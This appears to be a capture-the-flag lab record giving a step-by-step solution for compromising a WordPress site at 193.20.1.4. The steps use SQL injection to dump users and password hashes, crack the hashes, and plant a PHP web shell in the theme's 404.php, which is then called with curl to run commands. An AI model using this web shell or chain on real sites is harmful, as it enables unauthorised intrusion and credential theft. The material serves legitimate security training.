{"description":"An attack on wordpress by exploiting vulnerabilities in some plugins","goal":"<p>The final goal is to obtain credentials to access WordPress and add a web shell to obtain a Remote Code Execution and access, with a Local File Inclusion attack, the file /etc/passwd</p>","solution":"<p>Connect to the kali shell using the dsp.</p>\n<p>enable vnc running the script in ./home/vnc.sh</p>\n<p>connect to the GUI using a vncviewer</p>\n<p>browse using the kali's browser the target at the ip 193.20.1.4</p>\n<p>use the unknown mode answer Yes to the poll</p>\n<p>open with a text editor the script at /home/sql_inj_script.js</p>\n<p>copy/paste the first part in the browser's console after the reload of the page you will se an error in the console copy/paste the second step of the script and you'll get the users list in the console</p>\n<p>repeat again with the 3rd and 4th part of the script you'll get the hashes list in the browser's console.</p>\n<p>copy/paste the hash in the hash.txt file in the directory home open the terminal and do the following commands cd /home ./discover_psw.sh you'll find the match hash:pwd in the file cracked.txt</p>\n<p>login in at the following <a class=\"fui-Link ___1qmgydl f3rmtva f1ewtqcl fyind8e f1k6fduh f1w7gpdv fk6fouc fjoy568 figsok6 f1hu3pq6 f11qmguv f19f4twv f1tyq0we f1g0x7ka fhxju0i f1qch9an f1cnd47f fqv5qza f1vmzxwi f1o700av f13mvf36 f1cmlufx f9n3di6 f1ids18y f1tx3yz7 f1deo86v f1eh06m1 f1iescvh ftqa4ok f2hkw1w fhgqx19 f1olyrje f1p93eir f1h8hb77 f1x7u7e9 f10aw75t fsle3fq\" style=\"overflow-wrap: break-word;\" title=\"http://193.20.1.4/wp-login.php\" href=\"http://193.20.1.4/wp-login.php\" target=\"_blank\" rel=\"noopener noreferrer\">http://193.20.1.4/wp-login.php</a> open the theme editor and edit the page 404.php ofthe theme twentytwenty over write all the code with the following</p>\n<p><br />&nbsp;</p>\n<p><br />&nbsp;</p>\n<p>&lt;?php</p>\n<p>system($_GET['cmd']);</p>\n<p>/**</p>\n<p>&lt;SNIP&gt;</p>\n<p><br />&nbsp;</p>\n<p>call the following url for the remote code execution, you can do any shell command passing after the cmd parameter in the url here's an example</p>\n<p>curl -X GET &ldquo;<a class=\"fui-Link ___1qmgydl f3rmtva f1ewtqcl fyind8e f1k6fduh f1w7gpdv fk6fouc fjoy568 figsok6 f1hu3pq6 f11qmguv f19f4twv f1tyq0we f1g0x7ka fhxju0i f1qch9an f1cnd47f fqv5qza f1vmzxwi f1o700av f13mvf36 f1cmlufx f9n3di6 f1ids18y f1tx3yz7 f1deo86v f1eh06m1 f1iescvh ftqa4ok f2hkw1w fhgqx19 f1olyrje f1p93eir f1h8hb77 f1x7u7e9 f10aw75t fsle3fq\" style=\"overflow-wrap: break-word;\" title=\"http://193.20.1.4/wp-content/themes/twentytwenty/404.php?cmd=cat%20flag.txt%e2%80%9d\" href=\"http://193.20.1.4/wp-content/themes/twentytwenty/404.php?cmd=cat%20flag.txt&rdquo;\" target=\"_blank\" rel=\"noopener noreferrer\">http://193.20.1.4/wp-content/themes/twentytwenty/404.php?cmd=cat%20flag.txt&rdquo;</a></p>","author":"mgalateo"}
